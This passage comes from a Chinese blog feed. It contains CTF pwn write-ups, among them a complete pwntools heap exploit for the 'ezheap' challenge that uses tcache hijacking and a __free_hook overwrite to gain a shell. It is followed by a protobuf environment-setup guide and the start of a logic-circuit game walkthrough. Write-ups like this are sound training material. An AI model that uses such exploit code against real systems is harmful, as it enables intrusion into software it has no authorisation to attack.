rsi, rsp</span></span><br><span class="line"><span class="string">    push SYS_read</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push 0xFF   /* write size */</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push SYS_write</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x15</span>+asm(sc))</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x05-ezheap"><a href="#0x05-ezheap" class="headerlink" title="0x05 ezheap"></a>0x05 ezheap</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>劫持tcache管理堆。最多只能申请32个次，delete没有UAF，也没有堆溢出。但是edit函数非常地奇怪。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit_chunk</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *buf; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;one chance for you&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;content :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">8uLL</span>);</span><br><span class="line">  *buf = <span class="number">666666</span>;</span><br><span class="line">  ++a;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有一次机会可以往任意地址写一个666666（bytes类型）。注意*buf的类型是DWORD，所以实际上是写入0x00A2C2A。重点在于可以利用写进去的00，如果精心构造，可以利用这个00劫持tcache管理堆，造成堆叠。也就是同一个堆地址会进入到两条大小不同的tcachebin当中。</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>前置脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">c</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;choice\n&quot;</span>, <span class="built_in">str</span>(c).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    r.sendafter(<span class="string">b&quot;Size :\n&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&quot;Content :\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Index :\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">addr</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    r.sendafter(<span class="string">b&quot;content :\n&quot;</span>, addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Index :\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exit</span>():</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>先泄露地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x500</span>)  <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 4</span></span><br><span class="line">show(<span class="number">2</span>)  <span class="comment"># 从unsorted切割</span></span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1EC061</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)  <span class="comment"># 0xb0 4-&gt;3</span></span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 5   原4 tcache</span></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x361</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure><p>其实这里已经有为了后面的堆风水进行构造了。chunk4的地址是0x*400，最后一个字节刚好是00。为了防止unsortedbin切割都后面堆叠造成影响，我们需要先申请足够多的chunk，使unsortedchunk进入到smallbin中。然后把chunk5再次释放，使其先进入到tcache中，方便后面进行内容修改。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment"># 8 把unsortedchunk取到后面不够取，进到smallbin</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)  <span class="comment"># 0xb0 5-&gt;3 or 4-&gt;3</span></span><br><span class="line">delete(<span class="number">6</span>)  <span class="comment"># 0x110 6</span></span><br></pre></td></tr></table></figure><p>然后最重要的一步来了。现在堆长这样。</p><p><img src="https://c-lby.top/images/2024YLCTF-1/edit%E5%89%8D%E5%A0%86.png" alt="edit前堆"></p><p>红色框是0xb0大小chunk的头，蓝色框是0x110的。如果我在heap_base+0x105的地方开edit，那么00就会被写到蓝色框的低一位字节。这样一来，我一申请0x110，就能申请到0x*400的堆，我申请0xb0也是一样的。那这就达到了堆叠的效果。后面先申请0x110然后修改fd位为free_hook，再申请两个0xb0的堆，就能达到free_hook，修改为ogg或者system即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">edit(p64(heap_base+<span class="number">0x105</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>, p64(free_hook))  <span class="comment"># 9</span></span><br><span class="line">add(<span class="number">0xa0</span>, <span class="string">&quot;/bin/sh\x00&quot;</span>)  <span class="comment"># 10</span></span><br><span class="line">add(<span class="number">0xa0</span>, p64(system))  <span class="comment"># 11</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">c</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;choice\n&quot;</span>, <span class="built_in">str</span>(c).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    r.sendafter(<span class="string">b&quot;Size :\n&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&quot;Content :\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Index :\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">addr</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    r.sendafter(<span class="string">b&quot;content :\n&quot;</span>, addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Index :\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exit</span>():</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>)  <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 4</span></span><br><span class="line">show(<span class="number">2</span>)  <span class="comment"># 从unsorted切割</span></span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1EC061</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)  <span class="comment"># 0xb0 4-&gt;3</span></span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 5   原4 tcache</span></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x361</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment"># 8 把unsortedchunk取到后面不够取，进到smallbin</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)  <span class="comment"># 0xb0 5-&gt;3 or 4-&gt;3</span></span><br><span class="line">delete(<span class="number">6</span>)  <span class="comment"># 0x110 6</span></span><br><span class="line">edit(p64(heap_base+<span class="number">0x105</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">0x100</span>, p64(free_hook))  <span class="comment"># 9</span></span><br><span class="line">add(<span class="number">0xa0</span>, <span class="string">&quot;/bin/sh\x00&quot;</span>)  <span class="comment"># 10</span></span><br><span class="line">add(<span class="number">0xa0</span>, p64(system))  <span class="comment"># 11</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x06-msg-bot"><a href="#0x06-msg-bot" class="headerlink" title="0x06 msg_bot"></a>0x06 msg_bot</h2><p>protobuf+shellcode过滤。另起一篇<a href="https://c-lby.top/2024/10/12/YLCTF-msgbot-protobuf/">文章</a>细讲。</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>protobuf pwn题环境配置及基础操作</title>
      <link href="/2024/protobuf-install/"/>
      <url>/2024/protobuf-install/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-配置环境"><a href="#0x00-配置环境" class="headerlink" title="0x00 配置环境"></a>0x00 配置环境</h2><p>VMware Ubuntu22.04<br>VMware Ubuntu20.04<br>WSL2 Ubuntu22.04均按照步骤配置环境没有问题</p><p>windows环境没有测试</p><p>关于protobuf，网上有很多介绍，不多赘述。</p><h2 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h2><h3 id="一些注意事项"><a href="#一些注意事项" class="headerlink" title="一些注意事项"></a>一些注意事项</h3><p>请确保环境安装了make并且能正常使用，因为项目需要自己编译。</p><p>Ubuntu22是默认自带较高版本的protobuf的，如果你不打算两个版本同时存在在电脑上的话，可以选择卸载。（两个版本一起也能用，但比较麻烦，我没研究）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">which</span> protoc</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">protoc: /usr/bin/protoc（虽然不知道为什么我的实在anaconda下）</span></span><br><span class="line">rm -rf /usr/bin/protoc #这里的路径是上面显示的路径</span><br><span class="line"></span><br><span class="line">sudo rm -rf /usr/include/google/protobuf #头文件</span><br><span class="line">sudo rm -rf /usr/local/include/google/protobuf #头文件</span><br><span class="line">sudo rm -rf /usr/lib/libproto* #库文件</span><br><span class="line">sudo rm -rf /usr/local/lib/libproto* # 库文件</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/h799710/article/details/126762153">来源</a></p><h3 id="编译安装protoc库"><a href="#编译安装protoc库" class="headerlink" title="编译安装protoc库"></a>编译安装protoc库</h3><p>（protoc是protobuf的库，不是protobuf-c的，请注意区分）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wget https://github.com/protocolbuffers/protobuf/releases/download/v3.6.1/protobuf-all-3.6.1.tar.gz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tar -xvzf protobuf-all-3.6.1.tar.gz</span></span><br></pre></td></tr></table></figure><p>也可以在浏览器中下载后手动解压。这里下载的版本比较旧了，是为了适配后面要安装的protobuf-c，如果不需要，也可以下载最新版（但是一般做pwn题目前大多都还是C语言写的）。如果只需要C不需要其他语言的，也可以下载只有<a href="https://github.com/protocolbuffers/protobuf/releases/download/v3.6.1/protobuf-cpp-3.6.1.tar.gz">cpp版本</a>的，可以减小体积和加快编译（但不多）。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> protobuf-all-3.6.1</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./configure &amp;&amp; make &amp;&amp; sudo make install</span></span><br></pre></td></tr></table></figure><p>其实上面三步建议分开，要是哪一步出问题了还可以去查一查。在install之前可以运行<code>make check</code>检查一下。make需要花点时间，取决于你的电脑性能。编译完之后运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ln</span> -s /usr/local/lib/libprotobuf.so.17 /usr/lib/libprotobuf.so.17</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ln</span> -s /usr/local/lib/libprotoc.so.17 /usr/lib/libprotoc.so.17</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo ldconfig</span></span><br></pre></td></tr></table></figure><p>这时候输入<code>protoc --version</code>应该就会回显<code>libprotoc 3.6.1</code>，如果回显3.20.x，说明是Ubuntu22原本自带的版本没删干净。</p><h3 id="编译安装protobuf-c"><a href="#编译安装protobuf-c" class="headerlink" title="编译安装protobuf-c"></a>编译安装protobuf-c</h3><p>protobuf原生并不支持C，这里用一个第三方库来兼容C语言。编译步骤和上面一样。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wget https://github.com/protobuf-c/protobuf-c/releases/download/v1.5.0/protobuf-c-1.5.0.tar.gz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tar -xvzf protobuf-c-1.5.0.tar.gz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> protobuf-c-1.5.0</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./configure &amp;&amp; make &amp;&amp; sudo make install</span></span><br></pre></td></tr></table></figure><p>顺带一提，如果上面protobuf安装的版本过高，那么在configure的时候会提示没找到protobuf。</p><h3 id="安装python第三方库"><a href="#安装python第三方库" class="headerlink" title="安装python第三方库"></a>安装python第三方库</h3><p>写脚本要用到google对protobuf支持的第三方库。如果没安装，运行脚本时候会显示没有google库。不用像网上把整个google库都下下来。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pip3 install protobuf==3.20.3</span></span><br></pre></td></tr></table></figure><p>这里protobuf的版本要用到3.20.x（只有1 2 3），如果没指定版本直接安装了最新版，运行脚本的时候python会提示版本不兼容，protobuf版本过低，要更新protobuf，否则使用3.20.x版本的python库。安装完这个之后，环境就算是配置好了。</p><h2 id="基础使用方法"><a href="#基础使用方法" class="headerlink" title="基础使用方法"></a>基础使用方法</h2><p>-I参数指定proto源码目录，–c_out参数指定生成的类声明与实现文件的输出目录。如果proto文件就在当前目录，直接运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">protoc --c_out=. filename.proto</span></span><br></pre></td></tr></table></figure><p>那么文件就会生成在当前目录。如果你想出题和对照着函数实现来逆向，那么这一步是必要的。如果你要用python写脚本，那么你需要生成python的实现代码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">protoc --python_out=. filename.proto</span></span><br></pre></td></tr></table></figure><h2 id="运行须知"><a href="#运行须知" class="headerlink" title="运行须知"></a>运行须知</h2><p>如果程序使用了protobuf，那必定需要libprotobuf动态库的。上述安装的版本下，运行库的名字叫<code>libprotobuf-c.so.1</code>。假如protobuf_demo是一个使用了protobuf的程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ldd protobuf_demo</span></span><br><span class="line">        linux-vdso.so.1 (0x00007ffcc5597000)</span><br><span class="line">        libprotobuf-c.so.1 =&gt; /usr/local/lib/libprotobuf-c.so.1 (0x00007f2a99c64000)</span><br><span class="line">        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f2a99a3b000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007f2a99c81000)</span><br></pre></td></tr></table></figure><p>光有<code>libprotobuf-c.so.1</code>也不够，还需要<code>libprotobuf-c.so.1.0.0</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ldconfig -v</span></span><br><span class="line">...</span><br><span class="line">/usr/local/lib: (from /etc/ld.so.conf.d/libc.conf:2)</span><br><span class="line">        libprotobuf-c.so.1 -&gt; libprotobuf-c.so.1.0.0</span><br><span class="line">        libprotobuf.so.17 -&gt; libprotobuf.so.17.0.0</span><br><span class="line">        libprotobuf-lite.so.17 -&gt; libprotobuf-lite.so.17.0.0</span><br><span class="line">        libprotoc.so.17 -&gt; libprotoc.so.17.0.0</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>如果在一个纯净的环境（容器）或者版本不适配（高版本的protobuf动态库名字不一样）的情况下，不想安装完整的protobuf又想要运行程序的，可以把这两个文件放到<code>/usr/local/lib</code>下，并运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ln</span> -sf /usr/local/lib/libprotobuf-c.so.1.0.0 /usr/local/lib/libprotobuf-c.so.1</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo ldconfig</span></span><br></pre></td></tr></table></figure><p>如果不想破坏原本高版本的protobuf，可以就放在程序目录下，运行上面的命令先链接，然后利用patchelf来修改动态链接库路径。有时候也可能是不知道为什么程序就运行不了的，也可以用这种方式试试。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">patchelf --print-needed protobuf_demo <span class="comment">#打印程序需要的动态库</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">patchelf --replace-needed libprotobuf-c.so.1 ./libcprotobuf-c.so.1 protobuf <span class="comment">#第二个libcproto*是附件给你的或者你下载的动态库的路径</span></span></span><br></pre></td></tr></table></figure><p>配置容器时同理。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/lipd1tc9RGW3VW_WEpjQxA">Real返璞归真师傅的全面解析</a></p>]]></content>
      
      
      <categories>
          
          <category> protobuf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> protobuf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『图灵完备』完全攻略之基础逻辑电路（一）</title>
      <link href="/2024/Turing-Complete-1/"/>
      <url>/2024/Turing-Complete-1/</url>
      
        <content type="html"><![CDATA[<h2 id="原力觉醒"><a href="#原力觉醒" class="headerlink" title="原力觉醒"></a>原力觉醒</h2><p>只是想教会你如何连接导线</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E5%8E%9F%E5%8A%9B%E8%A7%89%E9%86%92.png" alt="原力觉醒"></p><h2 id="与非门"><a href="#与非门" class="headerlink" title="与非门"></a>与非门</h2><p>这一关要求玩家测试得出与非门（NAND）的真值表。什么是真值表？真值表其实就是输入和输出的对应关系。输入可以不止一个，在不同逻辑下，相同的输入可能会得到不同的输出。真值表可以让我们更直观地看出不同的逻辑关系。比如下图就是游戏中给出的与门（AND）的真值表。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E7%9C%9F%E5%80%BC%E8%A1%A8.png" alt="真值表"></p><p>回到这个关卡，题目已经给了我们与非门，我们只需要测试不同输入的情况下输出的情况，写在下方核对即可。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E4%B8%8E%E9%9D%9E%E9%97%A8.png" alt="与非门"></p><p>过关后，游戏告诉我们，利用这个元件可以造出电脑里的所有东西。</p><h2 id="非门"><a href="#非门" class="headerlink" title="非门"></a>非门</h2><p>非门就是我们常见的NOT，取反。题目要求我们利用与非门来搭建一个非门。<img src="https://c-lby.top/images/Turing-Complete/1/%E9%9D%9E%E9%97%A8%E7%9C%9F%E5%80%BC%E8%A1%A8.png" alt="非门真值表"></p><p>与非门有两个输入，但是非门只有一个输入。对比与非门的真值表我们可以很容易得出，当两个输入都是低电平的时候，输出为高电平，反之则为低电平。所以我们只要把输入同时给到与非门的两个接口，我们就能得到符合非门真值表的电路了。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E9%9D%9E%E9%97%A8.png" 